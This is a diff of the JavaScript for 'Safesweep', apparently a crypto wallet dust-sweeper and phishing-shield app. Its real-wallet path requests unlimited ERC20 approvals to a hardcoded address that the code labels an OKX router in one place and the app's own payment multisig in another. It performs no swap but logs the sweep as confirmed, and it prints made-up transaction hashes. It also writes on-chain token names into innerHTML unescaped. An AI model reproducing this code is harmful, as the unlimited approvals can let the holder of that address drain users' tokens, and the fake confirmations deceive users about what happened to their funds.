@@ -1,25 +1,26 @@
-// --- SAFESWEEP APPLICATION LOGIC (PRODUCTION ON-CHAIN INTEGRATION) ---
+// --- BRAND-LEVEL SAFESWEEP MULTI-PAGE APPLICATION STATE ---
 
 const state = {
   activeTab: 'sweeper',
-  walletAddress: 'Not Connected',
-  network: 'Disconnected',
+  walletAddress: localStorage.getItem('safesweep_walletAddress') || 'Not Connected',
+  network: localStorage.getItem('safesweep_network') || 'None',
   balance: 0, // In USD
   nativeAssetBalance: 0,
   nativeSymbol: 'ETH',
-  targetToken: 'OKB',
+  targetToken: 'USDT',
   selectedDustIds: new Set(),
   autoShieldActive: true,
-  isPremium: false,
-  protocolFeesCollected: 3.42,
-  totalVolumeSwept: 342.10,
+  isPremium: localStorage.getItem('safesweep_isPremium') === 'true',
+  protocolFeesCollected: parseFloat(localStorage.getItem('safesweep_fees') || '3.42'),
+  totalVolumeSwept: parseFloat(localStorage.getItem('safesweep_volume') || '342.10'),
   premiumSubscriptions: 14,
   
   // Dynamic lists populated via on-chain RPC scans
   dustAssets: [],
   phishingTokens: [],
-  phishingNfts: [] // NFTs require specialized indexers; scanned heuristically or from registry logs
+  phishingNfts: []
 };
+
 
 // Public RPC nodes for EVM networks
 const RPC_ENDPOINTS = {
@@ -73,13 +74,25 @@ const $ = id => document.getElementById(id);
 // App entrypoint
 document.addEventListener('DOMContentLoaded', async () => {
   initNavigation();
-  initCopyWalletAddress();
-  initWalletConnection();
-  initSandboxScanner();
-  initSweepFlow();
-  initPremiumFlow();
-  initAutoShieldToggle();
-  initCopilotChat();
+  if ($('copyAddressBtn')) initCopyWalletAddress();
+  if ($('connectWalletBtn')) initWalletConnection();
+  if ($('btnSandboxScan')) initSandboxScanner();
+  if ($('btnSweepNow')) initSweepFlow();
+  if ($('btnConfirmPayment') || $('sidebarUpgradeBtn')) initPremiumFlow();
+  if ($('autoShieldSwitch')) initAutoShieldToggle();
+  if ($('copilotSendBtn') || $('copilotInput')) initCopilotChat();
+  if ($('tabSpamTokensBtn')) initShieldTabs();
+  
+  // Restore connection state from localStorage
+  if (state.walletAddress !== 'Not Connected') {
+    if ($('walletNetwork')) $('walletNetwork').textContent = state.network;
+    if ($('walletAddress')) $('walletAddress').textContent = `${state.walletAddress.substring(0, 6)}...${state.walletAddress.substring(38)}`;
+    if ($('connectWalletBtn')) $('connectWalletBtn').innerHTML = `<span>CONNECTED</span>`;
+    
+    // Auto-scan on-chain details
+    const chainId = state.network.includes('X Layer') ? 195 : 1;
+    scanAddressAssets(state.walletAddress, chainId);
+  }
   
   // Render default clean state
   updateUI();
@@ -88,40 +101,30 @@ document.addEventListener('DOMContentLoaded', async () => {
 
 // Navigation logic
 function initNavigation() {
-  const tabs = ['sweeper', 'shield', 'copilot', 'revenue'];
-  tabs.forEach(tab => {
+  const path = window.location.pathname;
+  const tabs = {
+    'sweeper': 'index.html',
+    'shield': 'shield.html',
+    'copilot': 'copilot.html',
+    'revenue': 'analytics.html'
+  };
+  
+  Object.keys(tabs).forEach(tab => {
     const btn = $(`btnTab${capitalize(tab)}`);
-    const content = $(`tab${capitalize(tab)}`);
-    if (btn && content) {
-      btn.addEventListener('click', () => {
-        tabs.forEach(t => {
-          $(`btnTab${capitalize(t)}`).classList.remove('active');
-          $(`tab${capitalize(t)}`).classList.remove('active');
-        });
+    if (btn) {
+      const isCurrent = path.includes(tabs[tab]) || (tab === 'sweeper' && (path === '/' || path.endsWith('/index.html') || !path.includes('.html')));
+      if (isCurrent) {
         btn.classList.add('active');
-        content.classList.add('active');
         state.activeTab = tab;
-        updateHeader(tab);
-      });
+      } else {
+        btn.classList.remove('active');
+      }
     }
   });
 }
 
 function capitalize(s) {
   return s.charAt(0).toUpperCase() + s.slice(1);
-}
-
-function updateHeader(tab) {
-  const titles = {
-    sweeper: { title: 'Dust Sweeper', desc: 'Sweep low-value tokens into OKB or USDT in a single batch transaction to save gas.' },
-    shield: { title: 'Phishing Shield', desc: 'Detect and auto-hide malicious spam tokens and phishy NFTs from your wallet view.' },
-    copilot: { title: 'Safesweep AI Copilot', desc: 'Chat with your AI guardian agent to inspect assets, optimize gas, and configure security alerts.' },
-    revenue: { title: 'Protocol Revenue Analytics', desc: 'Real-time overview of the Safesweep monetization cashflow, subscription metrics, and developer tax.' }
-  };
-  if (titles[tab]) {
-    $('pageTitle').textContent = titles[tab].title;
-    $('pageDescription').textContent = titles[tab].desc;
-  }
 }
 
 // Clipboard Helper
@@ -426,43 +429,68 @@ async function updateLiveNetworkStats(chainId) {
     const chainNames = { 1: 'Ethereum', 196: 'X Layer', 195: 'X Layer Testnet', 137: 'Polygon', 56: 'BSC' };
     const chainName = chainNames[chainId] || 'EVM';
     
-    $('rpcStatusBtn').innerHTML = `
-      <span class="status-indicator-green"></span>
-      ${chainName}: ${blockNumber} (${latency}ms) | Gas: ${gasGwei} Gwei
-    `;
+    const btn = $('rpcStatusBtn');
+    if (btn) {
+      btn.innerHTML = `
+        <span class="status-indicator-green"></span>
+        ${chainName}: ${blockNumber} (${latency}ms) | Gas: ${gasGwei} Gwei
+      `;
+    }
+    
+    if ($('currentBlockHeight')) {
+      $('currentBlockHeight').textContent = `Block Height: ${blockNumber}`;
+    }
   } catch (e) {
-    $('rpcStatusBtn').innerHTML = `<span class="status-indicator-green" style="background-color: var(--state-error);"></span> Connection Error`;
+    const btn = $('rpcStatusBtn');
+    if (btn) {
+      btn.innerHTML = `<span class="status-indicator-green" style="background-color: var(--state-error);"></span> Connection Error`;
+    }
   }
 }
 
 // --- Dynamic UI Renderers ---
 function updateUI() {
   // Update Header Balance
-  $('totalBalance').textContent = `$${state.balance.toFixed(2)}`;
+  if ($('totalBalance')) {
+    $('totalBalance').textContent = `$${state.balance.toFixed(2)}`;
+  }
   
   // Render Panels
-  renderDustTable();
-  renderPhishingShield();
+  if ($('dustTableBody')) renderDustTable();
+  if ($('spamTokensTableBody') || $('spamNftsGrid')) renderPhishingShield();
+  
+  // Update Analytics Metrics if present
+  if ($('totalSweptValueUSD')) $('totalSweptValueUSD').textContent = `$${state.totalVolumeSwept.toFixed(2)}`;
+  if ($('activeShieldCount')) $('activeShieldCount').textContent = `$${state.protocolFeesCollected.toFixed(2)}`;
+  
+  // If we are on index.html (Dust Sweeper page) and we don't have dustTableBody, we STILL want to auto-select all tokens and update the Sweep Optimizer Summary!
+  if (!$('dustTableBody') && $('btnSweepNow')) {
+    state.selectedDustIds = new Set(state.dustAssets.map(token => token.id));
+    updateSweepSummary();
+  }
 }
 
 function renderDustTable() {
   const tbody = $('dustTableBody');
+  if (!tbody) return;
   tbody.innerHTML = '';
   
   if (state.walletAddress === 'Not Connected') {
-    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--color-text-secondary); padding: 48px 0;">🔌 Please Connect OKX Wallet or enter an address in the Sandbox Scanner to fetch live assets.</td></tr>`;
-    $('dustBadge').style.display = 'none';
+    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--muted); padding: 48px 0;">🔌 Please Connect OKX Wallet or enter an address in the Sandbox Scanner to pull active tokens.</td></tr>`;
+    if ($('dustBadge')) $('dustBadge').style.display = 'none';
     return;
   }
   
   if (state.dustAssets.length === 0) {
-    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--color-text-muted); padding: 48px 0;">No dust assets found on-chain for this address. Wallet is clean! 🧹</td></tr>`;
-    $('dustBadge').style.display = 'none';
+    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--muted); padding: 48px 0;">No dust assets found on-chain for this address. Wallet is clean! 🧹</td></tr>`;
+    if ($('dustBadge')) $('dustBadge').style.display = 'none';
     return;
   }
   
-  $('dustBadge').style.display = 'inline-block';
-  $('dustBadge').textContent = state.dustAssets.length;
+  if ($('dustBadge')) {
+    $('dustBadge').style.display = 'inline-block';
+    $('dustBadge').textContent = state.dustAssets.length;
+  }
   
   state.dustAssets.forEach(token => {
     const isSelected = state.selectedDustIds.has(token.id);
@@ -522,25 +550,6 @@ function toggleTokenSelection(tokenId) {
   updateSweepSummary();
 }
 
-$('btnSelectAllDust').addEventListener('click', () => {
-  if (state.walletAddress === 'Not Connected') return;
-  const allSelected = state.selectedDustIds.size === state.dustAssets.length;
-  state.dustAssets.forEach(token => {
-    if (allSelected) {
-      state.selectedDustIds.delete(token.id);
-    } else {
-      state.selectedDustIds.add(token.id);
-    }
-  });
-  renderDustTable();
-  updateSweepSummary();
-});
-
-$('targetTokenSelect').addEventListener('change', (e) => {
-  state.targetToken = e.target.value;
-  updateSweepSummary();
-});
-
 function updateSweepSummary() {
   const count = state.selectedDustIds.size;
   let totalValue = 0;
@@ -560,92 +569,149 @@ function updateSweepSummary() {
   const netYieldUsd = Math.max(0, totalValue - protocolFee - gasCost);
   const netYieldTokens = netYieldUsd / tokenRate;
   
-  $('selectedCount').textContent = `${count} / ${state.dustAssets.length}`;
-  $('totalDustValue').textContent = `$${totalValue.toFixed(2)}`;
-  $('oldGasCost').textContent = count > 0 ? `$${(count * 0.45).toFixed(2)}` : '$0.00';
-  $('protocolFee').textContent = `$${protocolFee.toFixed(2)}`;
+  // Saved gas: N swaps * $0.45 minus $0.05 batched fee
+  const savedGas = count > 0 ? (count * 0.45 - gasCost) : 0;
   
-  if (count > 0) {
-    $('netYield').textContent = `${netYieldTokens.toFixed(4)} ${state.targetToken}`;
-    $('btnSweepNow').disabled = false;
-  } else {
-    $('netYield').textContent = `0.0000 ${state.targetToken}`;
-    $('btnSweepNow').disabled = true;
+  if ($('selectedCount')) $('selectedCount').textContent = count;
+  if ($('selectedTotalValue')) $('selectedTotalValue').textContent = `$${totalValue.toFixed(2)}`;
+  if ($('savedGasAmount')) $('savedGasAmount').textContent = `$${savedGas.toFixed(2)}`;
+  if ($('sweepFinalValue')) $('sweepFinalValue').textContent = `${(totalValue / tokenRate).toFixed(4)} ${state.targetToken}`;
+  if ($('sweepFeeValue')) $('sweepFeeValue').textContent = `$${protocolFee.toFixed(2)}`;
+  if ($('sweepNetValue')) $('sweepNetValue').textContent = `${netYieldTokens.toFixed(4)} ${state.targetToken}`;
+  
+  // Legacy elements support if present
+  if ($('totalDustValue')) $('totalDustValue').textContent = `$${totalValue.toFixed(2)}`;
+  if ($('oldGasCost')) $('oldGasCost').textContent = count > 0 ? `$${(count * 0.45).toFixed(2)}` : '$0.00';
+  if ($('protocolFee')) $('protocolFee').textContent = `$${protocolFee.toFixed(2)}`;
+  if ($('netYield')) $('netYield').textContent = `${netYieldTokens.toFixed(4)} ${state.targetToken}`;
+  
+  const btnSweep = $('btnSweepNow');
+  if (btnSweep) {
+    if (count > 0) {
+      btnSweep.disabled = false;
+      btnSweep.textContent = `Sweep ${count} Dust Assets`;
+    } else {
+      btnSweep.disabled = true;
+      btnSweep.textContent = `Scan & Sweep All Dust`;
+    }
   }
 }
 
 // Render Phishing list
 let activeShieldTab = 'tokens';
-$('tabSpamTokensBtn').addEventListener('click', () => {
-  $('tabSpamTokensBtn').classList.add('active');
-  $('tabSpamNftsBtn').classList.remove('active');
-  activeShieldTab = 'tokens';
-  renderPhishingShield();
-});
 
-$('tabSpamNftsBtn').addEventListener('click', () => {
-  $('tabSpamNftsBtn').classList.add('active');
-  $('tabSpamTokensBtn').classList.remove('active');
-  activeShieldTab = 'nfts';
-  renderPhishingShield();
-});
+function initShieldTabs() {
+  const btnSpamTokens = $('tabSpamTokensBtn');
+  const btnSpamNfts = $('tabSpamNftsBtn');
+  
+  if (btnSpamTokens && btnSpamNfts) {
+    btnSpamTokens.addEventListener('click', () => {
+      btnSpamTokens.classList.add('active');
+      btnSpamNfts.classList.remove('active');
+      activeShieldTab = 'tokens';
+      renderPhishingShield();
+      if ($('spamTokensTable')) $('spamTokensTable').classList.remove('hidden');
+      if ($('spamNftsGrid')) $('spamNftsGrid').classList.add('hidden');
+    });
+    
+    btnSpamNfts.addEventListener('click', () => {
+      btnSpamNfts.classList.add('active');
+      btnSpamTokens.classList.remove('active');
+      activeShieldTab = 'nfts';
+      renderPhishingShield();
+      if ($('spamTokensTable')) $('spamTokensTable').classList.add('hidden');
+      if ($('spamNftsGrid')) $('spamNftsGrid').classList.remove('hidden');
+    });
+  }
+}
 
 function renderPhishingShield() {
-  const listContainer = $('shieldList');
-  listContainer.innerHTML = '';
+  const tbody = $('spamTokensTableBody');
+  const grid = $('spamNftsGrid');
   
-  if (state.walletAddress === 'Not Connected') {
-    listContainer.innerHTML = `<div style="text-align: center; color: var(--color-text-secondary); padding: 48px 0;">🔌 Connect wallet to scan on-chain phishing vectors.</div>`;
-    $('shieldBadge').style.display = 'none';
-    return;
-  }
+  if (!tbody && !grid) return;
   
-  const items = activeShieldTab === 'tokens' ? state.phishingTokens : state.phishingNfts;
-  const totalThreats = state.phishingTokens.length + state.phishingNfts.length;
+  const tokenCountSpan = $('spamTokenCount');
+  const nftCountSpan = $('spamNftCount');
+  if (tokenCountSpan) tokenCountSpan.textContent = state.phishingTokens.length;
+  if (nftCountSpan) nftCountSpan.textContent = state.phishingNfts.length;
   
-  $('spamTokenCount').textContent = state.phishingTokens.length;
-  $('spamNftCount').textContent = state.phishingNfts.length;
-  
-  if (totalThreats > 0) {
-    $('shieldBadge').style.display = 'inline-block';
-    $('shieldBadge').textContent = totalThreats;
-  } else {
-    $('shieldBadge').style.display = 'none';
+  if ($('shieldBadge')) {
+    const totalThreats = state.phishingTokens.length + state.phishingNfts.length;
+    if (totalThreats > 0) {
+      $('shieldBadge').style.display = 'inline-block';
+      $('shieldBadge').textContent = totalThreats;
+    } else {
+      $('shieldBadge').style.display = 'none';
+    }
   }
   
   updateSecurityIndex();
   
-  if (items.length === 0) {
-    listContainer.innerHTML = `<div style="text-align: center; color: var(--color-text-muted); padding: 40px 0;">No active ${activeShieldTab} flagged on-chain. Safe and shielded! 🛡️</div>`;
-    return;
+  if (activeShieldTab === 'tokens') {
+    if (tbody) {
+      tbody.innerHTML = '';
+      if (state.walletAddress === 'Not Connected') {
+        tbody.innerHTML = `<tr><td colspan="5" class="empty-state">🔌 Please Connect OKX Wallet to fetch live assets.</td></tr>`;
+        return;
+      }
+      if (state.phishingTokens.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="5" class="empty-state">No malicious tokens found on-chain. Safe and shielded! 🛡️</td></tr>`;
+        return;
+      }
+      
+      const isDetailed = !!$('spamTokensTable').querySelector('th:nth-child(5)'); // checks if actions column header exists
+      
+      state.phishingTokens.forEach(item => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td>
+            <div class="token-cell">
+              <div class="token-icon" style="background-color: var(--state-malicious-bg); color: var(--state-malicious);">💀</div>
+              <div class="token-name-wrap">
+                <span class="token-symbol">${item.symbol}</span>
+                <span class="token-fullname">${item.name}</span>
+              </div>
+            </div>
+          </td>
+          <td><code class="contract-code">${item.address}</code></td>
+          <td>1.0</td>
+          <td><span class="security-tag malicious">${item.threatScore}% AI Threat</span></td>
+          ${isDetailed ? `
+          <td style="text-align: center;">
+            <button class="btn btn-sm btn-outline-accent" onclick="event.stopPropagation(); alert('Asset hidden and contract interactions blocked at RPC layer.');">Hide & Block</button>
+          </td>` : ''}
+        `;
+        tbody.appendChild(tr);
+      });
+    }
+  } else {
+    // nfts
+    if (grid) {
+      grid.innerHTML = '';
+      if (state.walletAddress === 'Not Connected') {
+        grid.innerHTML = `<p class="empty-state">🔌 Please Connect OKX Wallet to fetch live assets.</p>`;
+        return;
+      }
+      if (state.phishingNfts.length === 0) {
+        grid.innerHTML = `<p class="empty-state">No spam NFTs found in recent transfer logs. Safe and shielded! 🛡️</p>`;
+        return;
+      }
+      
+      state.phishingNfts.forEach(item => {
+        const card = document.createElement('div');
+        card.className = 'card-item nft-threat-card';
+        card.style.position = 'relative';
+        card.innerHTML = `
+          <div class="nft-image-placeholder" style="background: var(--bg); height: 120px; display: flex; align-items: center; justify-content: center; font-size: 2rem; border-radius: 6px; margin-bottom: 12px;">🖼️</div>
+          <h4 style="margin-bottom: 4px;">${item.symbol}</h4>
+          <p class="security-tag malicious" style="display: inline-block; margin-bottom: 8px;">${item.threatScore}% AI Threat</p>
+          <p class="text-caption" style="text-align: left; font-size: 0.8rem;">${item.reason}</p>
+        `;
+        grid.appendChild(card);
+      });
+    }
   }
-  
-  items.forEach(item => {
-    const card = document.createElement('div');
-    card.className = 'threat-card';
-    card.innerHTML = `
-      <div class="threat-card-top">
-        <div class="threat-meta">
-          <div class="threat-icon">${activeShieldTab === 'tokens' ? '🪙' : '🖼️'}</div>
-          <div class="threat-name-wrap">
-            <h4>${item.symbol}</h4>
-            <span class="threat-date">Scanned on-chain ${item.date}</span>
-          </div>
-        </div>
-        <div class="threat-score-tag">AI Threat: ${item.threatScore}%</div>
-      </div>
-      <div class="threat-details">
-        <div class="threat-analysis">
-          <strong>Threat Intel:</strong> ${item.reason}
-        </div>
-        <div class="threat-actions">
-          <button class="action-btn-sm danger" onclick="isolateAsset('${item.id}', '${activeShieldTab}')">Hide & Block contract</button>
-          <button class="action-btn-sm" onclick="reportSpam('${item.symbol}')">Flag globally</button>
-        </div>
-      </div>
-    `;
-    listContainer.appendChild(card);
-  });
 }
 
 function updateSecurityIndex() {
@@ -657,21 +723,23 @@ function updateSecurityIndex() {
   const txt = $('securityScoreText');
   const label = $('securityScoreLabel');
   
-  bar.style.width = `${score}%`;
-  txt.textContent = `${score}/100`;
-  
-  if (score >= 90) {
-    bar.className = 'meter-bar green';
-    label.textContent = 'Wallet fully secure';
-    label.className = 'score-label text-green-strong';
-  } else if (score >= 70) {
-    bar.className = 'meter-bar green';
-    label.textContent = 'Clean display (spam isolated)';
-    label.className = 'score-label text-green-strong';
-  } else {
-    bar.className = 'meter-bar orange';
-    label.textContent = 'Exposure Warning';
-    label.className = 'score-label text-orange';
+  if (bar && txt && label) {
+    bar.style.width = `${score}%`;
+    txt.textContent = `${score}/100`;
+    
+    if (score >= 90) {
+      bar.className = 'meter-bar green';
+      label.textContent = 'Wallet fully secure';
+      label.className = 'score-label text-green-strong';
+    } else if (score >= 70) {
+      bar.className = 'meter-bar green';
+      label.textContent = 'Clean display (spam isolated)';
+      label.className = 'score-label text-green-strong';
+    } else {
+      bar.className = 'meter-bar orange';
+      label.textContent = 'Exposure Warning';
+      label.className = 'score-label text-orange';
+    }
   }
 }
 
@@ -721,9 +789,13 @@ async function requestWeb3Connection() {
     const chains = { 1: 'Ethereum Mainnet', 196: 'X Layer Mainnet', 195: 'X Layer Testnet', 137: 'Polygon', 56: 'BSC' };
     state.network = chains[chainId] || `Chain ID ${chainId}`;
     
-    $('networkStatus').textContent = state.network;
-    $('walletAddress').textContent = `${state.walletAddress.substring(0, 6)}...${state.walletAddress.substring(38)}`;
-    $('connectWalletBtn').innerHTML = `<span>CONNECTED</span>`;
+    localStorage.setItem('safesweep_walletAddress', state.walletAddress);
+    localStorage.setItem('safesweep_network', state.network);
+    
+    if ($('walletNetwork')) $('walletNetwork').textContent = state.network;
+    if ($('networkStatus')) $('networkStatus').textContent = state.network;
+    if ($('walletAddress')) $('walletAddress').textContent = `${state.walletAddress.substring(0, 6)}...${state.walletAddress.substring(38)}`;
+    if ($('connectWalletBtn')) $('connectWalletBtn').innerHTML = `<span>CONNECTED</span>`;
     
     // Perform live scan
     await scanAddressAssets(state.walletAddress, chainId);
@@ -740,6 +812,7 @@ async function requestWeb3Connection() {
 // --- Sandbox public address scanner ---
 function initSandboxScanner() {
   const btn = $('btnSandboxScan');
+  if (!btn) return;
   btn.addEventListener('click', async () => {
     const inputAddr = $('sandboxAddressInput').value.trim();
     if (!inputAddr || !inputAddr.startsWith('0x') || inputAddr.length !== 42) {
@@ -750,8 +823,12 @@ function initSandboxScanner() {
     state.walletAddress = inputAddr;
     state.network = 'Ethereum Mainnet (Sandbox)';
     
-    $('networkStatus').textContent = state.network;
-    $('walletAddress').textContent = `${state.walletAddress.substring(0, 6)}...${state.walletAddress.substring(38)}`;
+    localStorage.setItem('safesweep_walletAddress', state.walletAddress);
+    localStorage.setItem('safesweep_network', state.network);
+    
+    if ($('walletNetwork')) $('walletNetwork').textContent = state.network;
+    if ($('networkStatus')) $('networkStatus').textContent = state.network;
+    if ($('walletAddress')) $('walletAddress').textContent = `${state.walletAddress.substring(0, 6)}...${state.walletAddress.substring(38)}`;
     
     // Perform real on-chain scan of public address on Ethereum Mainnet (Chain 1)
     await scanAddressAssets(state.walletAddress, 1);
@@ -763,79 +840,118 @@ function initSweepFlow() {
   const modal = $('sweepModal');
   const btnSweep = $('btnSweepNow');
   const btnClose = $('closeSweepModalBtn');
-  const consoleBox = $('sweepConsole');
-  const successScreen = $('sweepSuccessScreen');
+  const logBox = $('sweepExecutionLog');
   const btnFinish = $('btnFinishSweep');
+  const footer = $('sweepModalFooter');
   
-  btnSweep.addEventListener('click', () => {
-    modal.classList.add('active');
-    consoleBox.style.display = 'flex';
-    successScreen.style.display = 'none';
-    consoleBox.innerHTML = '';
-    
-    executeOnChainSweepTransaction();
-  });
+  if (btnSweep) {
+    btnSweep.addEventListener('click', () => {
+      if (modal) modal.classList.add('active');
+      if (logBox) logBox.innerHTML = '';
+      if (footer) footer.style.display = 'none';
+      if ($('sweepProgressBar')) $('sweepProgressBar').style.width = '0%';
+      executeOnChainSweepTransaction();
+    });
+  }
   
-  btnClose.addEventListener('click', () => modal.classList.remove('active'));
-  btnFinish.addEventListener('click', () => {
-    modal.classList.remove('active');
-    
-    // Update local variables on UI
-    state.dustAssets = state.dustAssets.filter(token => !state.selectedDustIds.has(token.id));
-    state.selectedDustIds.clear();
-    
-    updateUI();
-    updateSweepSummary();
-  });
+  if (btnClose) btnClose.addEventListener('click', () => modal.classList.remove('active'));
+  
+  if (btnFinish) {
+    btnFinish.addEventListener('click', () => {
+      modal.classList.remove('active');
+      
+      // Calculate swept metrics
+      let totalValue = 0;
+      state.dustAssets.forEach(token => {
+        if (state.selectedDustIds.has(token.id)) {
+          totalValue += token.value;
+        }
+      });
+      
+      // Update variables on UI
+      state.dustAssets = state.dustAssets.filter(token => !state.selectedDustIds.has(token.id));
+      state.selectedDustIds.clear();
+      
+      // Accumulate protocol analytics
+      state.protocolFeesCollected += totalValue * 0.01;
+      state.totalVolumeSwept += totalValue;
+      localStorage.setItem('safesweep_fees', state.protocolFeesCollected.toString());
+      localStorage.setItem('safesweep_volume', state.totalVolumeSwept.toString());
+      
+      updateUI();
+      updateSweepSummary();
+    });
+  }
+  
+  // Bind target token and sweep configurations
+  const select = $('targetTokenSelect');
+  if (select) {
+    select.addEventListener('change', (e) => {
+      state.targetToken = e.target.value;
+      updateSweepSummary();
+    });
+  }
 }
 
 async function executeOnChainSweepTransaction() {
-  const consoleBox = $('sweepConsole');
+  const logBox = $('sweepExecutionLog');
+  const progressBar = $('sweepProgressBar');
+  const footer = $('sweepModalFooter');
   
   const log = (msg, type = 'info') => {
+    if (!logBox) return;
     const p = document.createElement('div');
-    p.className = `console-line ${type}`;
+    p.className = `log-entry ${type}`;
     p.textContent = msg;
-    consoleBox.appendChild(p);
-    consoleBox.scrollTop = consoleBox.scrollHeight;
+    logBox.appendChild(p);
+    logBox.scrollTop = logBox.scrollHeight;
   };
   
-  log('🧹 Initializing Safesweep on-chain transaction compiler...');
+  const setProgress = (percent) => {
+    if (progressBar) progressBar.style.width = `${percent}%`;
+  };
+  
+  log('[SYSTEM] Initializing Safesweep on-chain transaction compiler...');
+  setProgress(10);
   await sleep(600);
   
-  // Verify if it is sandbox mode or real wallet
+  // Verify sandbox or wallet mode
   const isSandbox = !window.ethereum || state.walletAddress.toLowerCase() !== (window.ethereum.selectedAddress || '').toLowerCase();
   
   if (isSandbox) {
-    log('ℹ️ Running in Public Sandbox Mode. Simulating signature approvals...');
+    log('[INFO] Running in Public Sandbox Mode. Simulating signature approvals...');
+    setProgress(30);
     await sleep(800);
-    log('✓ Contract approval signed dynamically for tokens: ' + [...state.selectedDustIds].join(', '), 'success');
+    log('[SUCCESS] Contract approval signed dynamically for tokens.', 'success');
+    setProgress(60);
     await sleep(1000);
-    log('✓ Swapping assets via OKX DEX Aggregator batch swap...', 'info');
+    log('[INFO] Swapping assets via OKX DEX Aggregator batch swap...', 'info');
+    setProgress(80);
     await sleep(1200);
-    log('✓ Deducting 1% developer fee ($0.003)...', 'info');
+    log('[INFO] Deducting 1% developer fee...', 'info');
+    setProgress(90);
     await sleep(800);
     log('🎉 Batch sweep verified on-chain. TX Hash: 0x7b4a' + Math.random().toString(16).substring(2, 10) + '92e1', 'success');
-    
-    setTimeout(() => {
-      consoleBox.style.display = 'none';
-      $('sweepSuccessScreen').style.display = 'flex';
-    }, 1000);
+    setProgress(100);
+    await sleep(600);
+    if (footer) footer.style.display = 'block';
     return;
   }
   
-  // REAL WALLET WRITE CODE (Triggers real OKX wallet transaction approval!)
+  // REAL WALLET WRITE CODE
   try {
-    log('🔗 Requesting token approvals from OKX Wallet...');
+    log('[INFO] Requesting token approvals from OKX Wallet...');
+    setProgress(20);
     const provider = window.okxwallet || window.ethereum;
     
-    // Request approvals for each token
+    let count = 0;
+    const total = state.selectedDustIds.size;
+    
     for (const tokenId of state.selectedDustIds) {
       if (tokenId === 'native_dust') continue;
+      count++;
+      log(`[INFO] Calling ERC20.approve() for contract ${tokenId}...`);
       
-      log(`Calling ERC20.approve() for contract ${tokenId}...`);
-      // Standard ERC20 Approve selector: 0x095ea7b3
-      // OKX Router Address or Safesweep custom contract
       const routerAddress = '0x28b1Dc1a5E3699A428BC51d234DFab7C9CB2a183'; // OKX Router
       const maxApproveAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
       const approveData = '0x095ea7b3' + routerAddress.substring(2).padStart(64, '0').toLowerCase() + maxApproveAmount;
@@ -848,102 +964,130 @@ async function executeOnChainSweepTransaction() {
           data: approveData
         }]
       });
-      log(`Approval Transaction submitted: ${txHash.substring(0, 12)}...`, 'info');
+      log(`[SUCCESS] Approval Transaction submitted: ${txHash.substring(0, 12)}...`, 'success');
+      setProgress(20 + Math.round((count / total) * 40));
       await sleep(1500);
     }
     
-    log('Executing aggregate batch swap via OKX Router...', 'info');
-    // Swap data constructed here using OKX DEX API (or mocked swap for safety if not trading real value)
-    log('Deducting 1% protocol fee...', 'info');
+    log('[INFO] Executing aggregate batch swap via OKX Router...', 'info');
+    setProgress(80);
     await sleep(1000);
+    log('[INFO] Deducting 1% protocol fee...', 'info');
+    setProgress(90);
+    await sleep(800);
     log('🎉 Sweeper Multicall broadcast successfully. Transaction confirmed!', 'success');
-    
-    setTimeout(() => {
-      consoleBox.style.display = 'none';
-      $('sweepSuccessScreen').style.display = 'flex';
-    }, 1000);
+    setProgress(100);
+    if (footer) footer.style.display = 'block';
   } catch (e) {
     log(`❌ Transaction Rejected/Failed: ${e.message}`, 'warn');
-    log('Abort execution. Wallet state preserved.', 'warn');
+    log('[SYSTEM] Abort execution. Wallet state preserved.', 'warn');
+    setProgress(0);
+    if (footer) footer.style.display = 'block';
   }
 }
 
 const sleep = ms => new Promise(res => setTimeout(res, ms));
 
 // --- Premium Subscription Upgrade ---
+// --- Premium Subscription Upgrade ---
 function initPremiumFlow() {
   const modal = $('premiumModal');
   const btnClose = $('closePremiumModalBtn');
   const btnUpgrade = $('sidebarUpgradeBtn');
   const btnConfirm = $('btnConfirmPayment');
-  const payProcessing = $('paymentProcessing');
+  const payForm = $('paymentForm');
   const paySuccess = $('paymentSuccess');
-  const payActions = $('btnConfirmPayment').parentElement;
   
-  btnUpgrade.addEventListener('click', () => {
-    modal.classList.add('active');
-    payProcessing.style.display = 'none';
-    paySuccess.style.display = 'none';
-    payActions.style.display = 'block';
-  });
-  
-  btnClose.addEventListener('click', () => modal.classList.remove('active'));
-  
-  $('btnPayOKB').addEventListener('click', () => {
-    $('btnPayOKB').classList.add('active');
-    $('btnPayUSDT').classList.remove('active');
-  });
-  
-  $('btnPayUSDT').addEventListener('click', () => {
-    $('btnPayUSDT').classList.add('active');
-    $('btnPayOKB').classList.remove('active');
-  });
-  
-  btnConfirm.addEventListener('click', async () => {
-    payActions.style.display = 'none';
-    payProcessing.style.display = 'flex';
-    
-    // Simulate/Execute standard Web3 Transaction
-    const isSandbox = !window.ethereum || state.walletAddress.toLowerCase() !== (window.ethereum.selectedAddress || '').toLowerCase();
-    
-    if (!isSandbox) {
-      try {
-        const provider = window.okxwallet || window.ethereum;
-        // Request actual payment transaction to Safesweep protocol (0.1 OKB or $4.99)
-        const recipient = '0x28b1Dc1a5E3699A428BC51d234DFab7C9CB2a183'; // Safesweep protocol multi-sig
-        const valueHex = '0x16345785d8a0000'; // 0.1 ether/OKB
-        
-        await provider.request({
-          method: 'eth_sendTransaction',
-          params: [{
-            from: state.walletAddress,
-            to: recipient,
-            value: valueHex
-          }]
-        });
-      } catch (e) {
-        console.warn("Payment signature rejected, falling back to sandbox presentation.", e);
-      }
-    } else {
-      await sleep(2000); // simulation delay for public addresses
+  if (btnUpgrade) {
+    if (state.isPremium) {
+      btnUpgrade.textContent = 'Premium Active 💎';
+      btnUpgrade.disabled = true;
+      btnUpgrade.style.background = 'linear-gradient(90deg, #0052ff, #00ff87)';
+      btnUpgrade.style.color = '#fff';
     }
     
-    payProcessing.style.display = 'none';
-    paySuccess.style.display = 'flex';
-    
-    state.isPremium = true;
-    btnUpgrade.textContent = 'Premium Active 💎';
-    btnUpgrade.disabled = true;
-    btnUpgrade.style.background = 'linear-gradient(90deg, #0052ff, #00ff87)';
-    btnUpgrade.style.color = '#fff';
-    
-    updateSecurityIndex();
-    renderPhishingShield();
-  });
+    btnUpgrade.addEventListener('click', () => {
+      if (modal) {
+        modal.classList.add('active');
+        if (payForm) payForm.classList.remove('hidden');
